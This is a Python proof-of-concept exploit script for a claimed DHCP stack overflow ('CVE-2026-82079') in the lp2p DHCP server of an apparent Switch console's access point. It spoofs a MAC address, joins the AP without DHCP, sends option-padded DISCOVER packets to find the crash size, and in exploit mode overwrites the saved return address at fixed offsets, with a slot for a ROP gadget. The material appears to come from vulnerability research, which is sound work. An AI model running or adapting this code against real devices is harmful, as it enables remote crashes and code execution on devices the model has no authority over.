#!/usr/bin/env python3
"""
CVE-2026-82079 — First-Packet DHCP Overflow

The lp2p DHCP server ignores packets after handing out the initial lease.
This script bypasses NetworkManager by:
  1. Associating with the Switch AP using wpa_supplicant (no DHCP)
  2. Sending a crafted DHCP DISCOVER as the VERY FIRST packet
  3. The server MUST process it since no lease exists yet

Usage:
    sudo python3 -Iu lp2p_dhcp_first_packet.py --ssid switch_F3DCDB0100S --password <pass>
"""

import subprocess
import socket
import struct
import random
import time
import json
import sys
import os
import signal
import argparse
import tempfile
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
SWITCH_IP = "192.168.0.1"
IFACE = "wlp5s0"


def get_iface_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return bytes(int(b, 16) for b in f.read().strip().split(":"))
    except Exception:
        return bytes([0x02] + [random.randint(0, 255) for _ in range(5)])


def random_mac():
    """Generate a random locally-administered MAC address."""
    mac = [0x02, random.randint(0, 255), random.randint(0, 255),
           random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)]
    return bytes(mac)


def disconnect_nm(iface, spoof_mac=None):
    """Disconnect NetworkManager and prevent it from managing the interface."""
    print("[*] Disconnecting NetworkManager...")
    subprocess.run(["nmcli", "device", "disconnect", iface],
                   capture_output=True, timeout=10)
    time.sleep(1)
    subprocess.run(["nmcli", "device", "set", iface, "managed", "no"],
                   capture_output=True, timeout=10)
    time.sleep(1)
    # Kill any existing wpa_supplicant for this interface
    subprocess.run(["pkill", "-f", f"wpa_supplicant.*{iface}"],
                   capture_output=True)
    time.sleep(0.5)
    # Flush any existing IP
    subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
    # Bring link down for MAC change
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    time.sleep(0.3)
    if spoof_mac:
        mac_str = ":".join(f"{b:02x}" for b in spoof_mac)
        print(f"[*] Setting MAC to {mac_str}...")
        subprocess.run(["ip", "link", "set", iface, "address", mac_str],
                       capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    time.sleep(0.3)
    print("[+] NetworkManager disconnected")


def associate_wpa(iface, ssid, password):
    """Associate with AP using wpa_supplicant only (NO DHCP)."""
    print(f"[*] Associating with {ssid} via wpa_supplicant (no DHCP)...")

    # Create wpa_supplicant config
    conf = tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                        prefix="wpa_lp2p_", delete=False)
    conf.write(f"""ctrl_interface=/run/wpa_supplicant_{os.getpid()}
network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
""")
    conf.close()
    conf_path = conf.name

    # Start wpa_supplicant
    ctrl_dir = f"/run/wpa_supplicant_{os.getpid()}"
    os.makedirs(ctrl_dir, exist_ok=True)

    proc = subprocess.Popen(
        ["wpa_supplicant", "-i", iface, "-c", conf_path, "-D", "nl80211", "-B"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    proc.wait(timeout=10)
    if proc.returncode != 0:
        err = proc.stderr.read().decode()
        print(f"[!] wpa_supplicant failed: {err}")
        os.unlink(conf_path)
        return None, None

    print("[*] Waiting for association...")
    # Wait for association (check with iw)
    for attempt in range(20):
        time.sleep(0.5)
        result = subprocess.run(["iw", iface, "link"], capture_output=True, text=True)
        if "Connected to" in result.stdout or "SSID:" in result.stdout:
            print(f"[+] Associated with {ssid}!")
            return conf_path, ctrl_dir
        if attempt % 5 == 4:
            print(f"    ... waiting ({attempt+1}/20)")

    print("[!] Association timed out")
    os.unlink(conf_path)
    return None, None


def build_dhcp_discover(mac, options_payload=b"", xid=None):
    """Build a DHCP DISCOVER with custom options payload."""
    if xid is None:
        xid = random.randint(0, 0xFFFFFFFF)

    # DHCP header
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)   # op, htype, hlen, hops
    pkt += struct.pack("!I", xid)              # xid
    pkt += struct.pack("!HH", 0, 0x8000)      # secs, flags (broadcast)
    pkt += b"\x00" * 4   # ciaddr
    pkt += b"\x00" * 4   # yiaddr
    pkt += b"\x00" * 4   # siaddr
    pkt += b"\x00" * 4   # giaddr
    pkt += mac + b"\x00" * 10  # chaddr (16 bytes)
    pkt += b"\x00" * 64  # sname
    pkt += b"\x00" * 128 # file
    pkt += b"\x63\x82\x53\x63"  # magic cookie

    # Standard options
    pkt += bytes([53, 1, 1])        # DHCP Message Type: DISCOVER
    pkt += bytes([61, 7, 1]) + mac  # Client Identifier
    pkt += bytes([55, 4, 1, 3, 6, 28])  # Parameter Request List

    # Overflow payload
    pkt += options_payload

    # End
    pkt += bytes([255])

    return pkt, xid


def build_overflow_options(total_size, fill=0x41):
    """Build DHCP options totaling target size, using vendor/private option codes."""
    opts = b""
    remaining = total_size
    # Use option codes that are likely to be parsed and copied to the stack buffer
    for code in [43, 60, 77, 12] + list(range(224, 255)):
        if remaining <= 2:
            break
        vlen = min(255, remaining - 2)
        opts += bytes([code, vlen]) + bytes([fill] * vlen)
        remaining -= (2 + vlen)
    return opts


def build_rop_overflow(mac, offset_x30=528, gadget_addr=None):
    """Build the actual exploit payload with ROP chain.

    From prior analysis:
      buffer boundary: 512 bytes
      x29 offset: 520
      x30 offset: 528

    Layout:
      [0..511]   = buffer fill (512 bytes)
      [512..519] = saved x29 (frame pointer)
      [520..527] = saved x30 (return address) ← our ROP entry
    """
    # For now, build a crash-test pattern to confirm we control x30
    # Pattern: 'AAAA...' filling buffer, then recognizable values at x29/x30

    payload = b""

    # Fill buffer (512 bytes)
    payload += b"A" * 512

    # x29 (frame pointer) — 8 bytes
    payload += struct.pack("<Q", 0x4141414141414141)

    # x30 (return address) — 8 bytes
    # Use a recognizable pattern so crash logs show we control PC
    if gadget_addr:
        payload += struct.pack("<Q", gadget_addr)
    else:
        # Distinctive pattern — if the crash shows PC = 0x4242424242424242,
        # we know we control the return address
        payload += struct.pack("<Q", 0x4242424242424242)

    return payload


def send_dhcp_raw(iface, pkt, timeout=3):
    """Send DHCP via raw UDP broadcast socket, receive response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())  # SO_BINDTODEVICE
    sock.settimeout(timeout)
    try:
        sock.bind(("0.0.0.0", 68))
        sock.sendto(pkt, ("255.255.255.255", 67))
        try:
            data, addr = sock.recvfrom(4096)
            return data, addr
        except socket.timeout:
            return None, None
    finally:
        sock.close()


def send_dhcp_unicast(iface, pkt, timeout=3):
    """Send DHCP via unicast to Switch IP."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    sock.settimeout(timeout)
    try:
        sock.bind(("0.0.0.0", 68))
        sock.sendto(pkt, (SWITCH_IP, 67))
        try:
            data, addr = sock.recvfrom(4096)
            return data, addr
        except socket.timeout:
            return None, None
    finally:
        sock.close()


def ping_check(target, count=1, timeout=2):
    r = subprocess.run(["ping", "-c", str(count), "-W", str(timeout), target],
                       capture_output=True)
    return r.returncode == 0


def cleanup(iface, conf_path=None, ctrl_dir=None, orig_mac=None):
    """Restore NetworkManager control and original MAC."""
    print("\n[*] Cleaning up...")
    subprocess.run(["pkill", "-f", f"wpa_supplicant.*{iface}"],
                   capture_output=True)
    time.sleep(0.5)
    subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
    # Restore original MAC
    if orig_mac:
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        time.sleep(0.2)
        subprocess.run(["ip", "link", "set", iface, "address", orig_mac],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
        time.sleep(0.2)
    subprocess.run(["nmcli", "device", "set", iface, "managed", "yes"],
                   capture_output=True)
    if conf_path and os.path.exists(conf_path):
        os.unlink(conf_path)
    if ctrl_dir and os.path.exists(ctrl_dir):
        subprocess.run(["rm", "-rf", ctrl_dir], capture_output=True)
    print("[+] NetworkManager restored")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--iface", default=IFACE)
    parser.add_argument("--mode", choices=["probe", "boundary", "exploit"],
                        default="probe",
                        help="probe=test sizes, boundary=find crash point, "
                             "exploit=send ROP payload")
    args = parser.parse_args()

    if os.getuid() != 0:
        print("[!] Must run as root")
        sys.exit(1)

    # Save original MAC and generate a spoofed one
    orig_mac_s = None
    try:
        with open(f"/sys/class/net/{args.iface}/address") as f:
            orig_mac_s = f.read().strip()
    except Exception:
        pass

    spoofed_mac = random_mac()
    mac = spoofed_mac
    mac_s = ":".join(f"{b:02x}" for b in mac)

    print("=" * 60)
    print("  CVE-2026-82079 — First-Packet DHCP Overflow")
    print("=" * 60)
    print(f"  Mode: {args.mode}")
    print(f"  Interface: {args.iface}")
    print(f"  Spoofed MAC: {mac_s} (random, fresh to DHCP server)")
    print(f"  SSID: {args.ssid}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60)

    conf_path = None
    ctrl_dir = None

    def on_signal(*a):
        cleanup(args.iface, conf_path, ctrl_dir, orig_mac_s)
        sys.exit(1)
    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    # Step 1: Disconnect NetworkManager and set spoofed MAC
    disconnect_nm(args.iface, spoof_mac=spoofed_mac)

    # Step 2: Associate with AP (no DHCP)
    conf_path, ctrl_dir = associate_wpa(args.iface, args.ssid, args.password)
    if not conf_path:
        print("[!] Failed to associate")
        cleanup(args.iface)
        sys.exit(1)

    # Verify association
    result = subprocess.run(["iw", args.iface, "link"],
                           capture_output=True, text=True)
    print(f"    Link: {result.stdout.strip()[:200]}")

    # Assign a manual IP so broadcasts route correctly
    # Use a high address unlikely to conflict
    print("[*] Assigning temporary IP 192.168.0.200/24...")
    subprocess.run(["ip", "addr", "add", "192.168.0.200/24", "dev", args.iface],
                   capture_output=True)
    subprocess.run(["ip", "route", "add", "default", "via", "192.168.0.1",
                    "dev", args.iface], capture_output=True)
    time.sleep(0.5)

    # Verify connectivity to Switch
    print("[*] Verifying connectivity...")
    alive = ping_check(SWITCH_IP, count=1, timeout=2)
    print(f"    Ping: {'OK' if alive else 'FAIL'}")
    if not alive:
        print("[!] Cannot reach Switch — trying without gateway...")
        # Maybe just the route is enough
        subprocess.run(["ip", "route", "del", "default"], capture_output=True)
        time.sleep(0.3)
        alive = ping_check(SWITCH_IP, count=1, timeout=2)
        print(f"    Ping retry: {'OK' if alive else 'FAIL'}")

    results = []

    if args.mode == "probe":
        # Phase 1: Send normal DHCP DISCOVER first (should get OFFER)
        print("\n--- Phase 1: Normal DHCP DISCOVER ---")
        pkt, xid = build_dhcp_discover(mac)
        print(f"  Sending {len(pkt)}B DISCOVER (xid={xid:#010x})...")

        # Try broadcast first
        resp, addr = send_dhcp_raw(args.iface, pkt, timeout=5)
        if not resp:
            print(f"  [-] No response on broadcast, trying unicast to {SWITCH_IP}...")
            resp, addr = send_dhcp_unicast(args.iface, pkt, timeout=5)
        if resp:
            print(f"  [+] Got response from {addr}: {len(resp)}B")
            # Parse message type
            cookie_pos = resp.find(b"\x63\x82\x53\x63")
            if cookie_pos >= 0:
                pos = cookie_pos + 4
                while pos < len(resp) and resp[pos] != 255:
                    if resp[pos] == 0:
                        pos += 1
                        continue
                    otype, olen = resp[pos], resp[pos+1]
                    if otype == 53 and olen == 1:
                        mtype = {2: "OFFER", 5: "ACK"}.get(resp[pos+2], f"type({resp[pos+2]})")
                        print(f"  [+] DHCP {mtype}!")
                        # Extract offered IP
                        yiaddr = resp[16:20]
                        print(f"  [+] Offered IP: {'.'.join(str(b) for b in yiaddr)}")
                        results.append({"phase": "normal_discover", "response": mtype,
                                       "offered_ip": '.'.join(str(b) for b in yiaddr)})
                        break
                    pos += 2 + olen
        else:
            print(f"  [-] No response (server may require different approach)")
            results.append({"phase": "normal_discover", "response": None})

        # Phase 2: Send overflow probes with increasing sizes
        print("\n--- Phase 2: Overflow probes ---")
        sizes = [64, 128, 256, 384, 448, 496, 512, 520, 528, 536, 544, 576, 640, 1024]

        for sz in sizes:
            extra = build_overflow_options(sz)
            pkt, xid = build_dhcp_discover(mac, options_payload=extra)
            print(f"  opts={len(extra):5d}B pkt={len(pkt):5d}B → ", end="", flush=True)

            resp, addr = send_dhcp_raw(args.iface, pkt, timeout=3)
            if not resp:
                resp, addr = send_dhcp_unicast(args.iface, pkt, timeout=3)
            if resp:
                cookie_pos = resp.find(b"\x63\x82\x53\x63")
                mtype = "?"
                if cookie_pos >= 0:
                    pos = cookie_pos + 4
                    while pos < len(resp) and resp[pos] != 255:
                        if resp[pos] == 0:
                            pos += 1
                            continue
                        otype, olen = resp[pos], resp[pos+1]
                        if otype == 53 and olen == 1:
                            mtype = {2: "OFFER", 5: "ACK"}.get(resp[pos+2], str(resp[pos+2]))
                            break
                        pos += 2 + olen
                print(f"DHCP {mtype} ({len(resp)}B)")
                results.append({"size": sz, "opts": len(extra), "pkt": len(pkt),
                               "response": mtype, "resp_len": len(resp)})
            else:
                # Check if Switch is still alive via ARP or connection test
                time.sleep(1)
                # Try to connect to HTTP port as alive check
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((SWITCH_IP, 80))
                    s.close()
                    alive = True
                except:
                    alive = False
                print(f"no response, alive={alive}")
                results.append({"size": sz, "opts": len(extra), "pkt": len(pkt),
                               "response": None, "alive": alive})
                if not alive:
                    print(f"\n  [!!!] POSSIBLE CRASH at opts={len(extra)}B")
                    time.sleep(10)
                    break

            time.sleep(0.5)

    elif args.mode == "exploit":
        # Send the actual ROP exploit as first packet
        print("\n--- Exploit mode: ROP payload as first DHCP packet ---")
        payload = build_rop_overflow(mac)
        # Pack as DHCP options
        opts = build_overflow_options(len(payload), fill=0x41)
        # Actually, we need to embed our precise payload, not generic fill
        # Rebuild with our exact bytes
        opts = b""
        remaining = len(payload)
        offset = 0
        for code in [43, 60, 77, 12] + list(range(224, 255)):
            if remaining <= 0:
                break
            vlen = min(255, remaining)
            opts += bytes([code, vlen]) + payload[offset:offset+vlen]
            remaining -= vlen
            offset += vlen

        pkt, xid = build_dhcp_discover(mac, options_payload=opts)
        print(f"  Payload: {len(payload)}B, options: {len(opts)}B, packet: {len(pkt)}B")
        print(f"  x30 target: 0x4242424242424242 (crash test pattern)")

        resp, addr = send_dhcp_raw(args.iface, pkt, timeout=5)
        if resp:
            print(f"  Response: {len(resp)}B")
        else:
            print(f"  No response")

        time.sleep(2)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((SWITCH_IP, 80))
            s.close()
            print(f"  Switch still alive (HTTP port open)")
        except:
            print(f"  Switch appears DOWN — possible crash with controlled PC!")

        results.append({"mode": "exploit", "payload_size": len(payload),
                        "pkt_size": len(pkt)})

    # Save evidence
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "first_packet_results.json"
    with open(path, "w") as f:
        json.dump({
            "test": "first_packet_dhcp_overflow",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "mode": args.mode,
            "ssid": args.ssid,
            "mac": mac_s,
            "results": results,
        }, f, indent=2, default=str)
    print(f"\nEvidence saved: {path}")

    # Cleanup
    cleanup(args.iface, conf_path, ctrl_dir, orig_mac_s)


if __name__ == "__main__":
    main()
